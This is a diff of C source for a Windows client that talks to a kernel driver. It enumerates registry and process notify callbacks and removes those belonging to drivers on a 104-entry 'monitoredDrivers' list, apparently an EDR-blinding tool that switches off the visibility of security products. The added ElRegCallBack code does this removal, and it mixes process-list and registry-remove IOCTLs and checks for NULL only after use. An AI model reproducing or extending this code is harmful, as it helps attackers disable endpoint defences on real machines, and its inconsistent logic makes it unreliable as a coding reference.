@@ -56,9 +56,16 @@ struct threadArgs {
 
 
 
+
 #pragma warning (disable: 4996)
 
 #define _CRT_SECURE_NO_WARNINGS
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
 
 
 struct ModulesData {
@@ -743,21 +750,15 @@ BOOL ListRegCallBack(HANDLE hDevice) {
         &bytesReturned,
         NULL
     );
-    //if (resultArray == NULL) {
-    //    fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
-    //    free(resultArray);
-    //    return FALSE;
-    //}
-    //if (bytesReturned == 0) {
-    //    fprintf(stderr, "No data returned from driver.\n");
-    //    free(resultArray);
-    //    return FALSE;
-    //}
-    //for (size_t i = 0; i < 64; i++) {
-    //    if (resultArray[i].ModuleBase == 0)
-    //        continue;
-    //    printf("Registry Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
-    //}
+
+    for (int i = 0; i < 64; i++) {
+        if (resultArray[i].ModuleBase) {
+            printf("Module name: %s\n", resultArray[i].ModuleName);
+            printf("Module addr: %llx\n\n", resultArray[i].ModuleBase);
+        }
+
+    }
+
     return result;
 }
 
@@ -836,23 +837,58 @@ BOOL ElRegCallBack(HANDLE hDevice) {
     ULONG64 modulesCount = 0;
     BOOL result;
 
+    resultArray = (ModulesData*)malloc(sizeof(ModulesData) * 64);
+
     result = DeviceIoControl(
         hDevice,
-        IOCTL_REM_REG_CALLBACK,
+        IOCTL_LIST_PROC_CALLBACK,
         NULL,
         0,
-        NULL,
-        0,
+        resultArray,
+        sizeof(ModulesData) * 64,
         &bytesReturned,
         NULL
     );
+    if (resultArray == NULL) {
+        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
+        free(resultArray);
+        return FALSE;
+    }
+    if (bytesReturned == 0) {
+        fprintf(stderr, "No data returned from driver.\n");
+        free(resultArray);
+        return FALSE;
+    }
+    for (size_t i = 0; i < 64; i++) {
+        if (resultArray[i].ModuleBase == 0)
+            continue;
+        printf("Process Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
 
-    if (!result) {
-        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
+        for (size_t j = 0; j < 104; j++) {
+            if (_stricmp(resultArray[i].ModuleName, monitoredDrivers[j]) == 0) {
+                printf("Removing Process Notify Callback %s at base address 0x%llx\n", resultArray[i].ModuleName, resultArray[i].ModuleBase);
+                DWORD bytesReturnedRem;
+                BOOL remResult = DeviceIoControl(
+                    hDevice,
+                    IOCTL_REM_REG_CALLBACK,
+                    &resultArray[i].ModuleName,
+                    sizeof(resultArray[i].ModuleName),
+                    NULL,
+                    0,
+                    &bytesReturnedRem,
+                    NULL
+                );
+                if (remResult) {
+                    printf("Successfully removed callback for %s\n", resultArray[i].ModuleName);
+                }
+                else {
+                    fprintf(stderr, "Failed to remove callback for %s. Error: %lu\n", resultArray[i].ModuleName, GetLastError());
+                }
+            }
+        }
+        printf("Process Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
     }
-    else {
-        printf("Successfully removed registry notify routine callback.\n");
-    }
+    
     return result;
 }
 
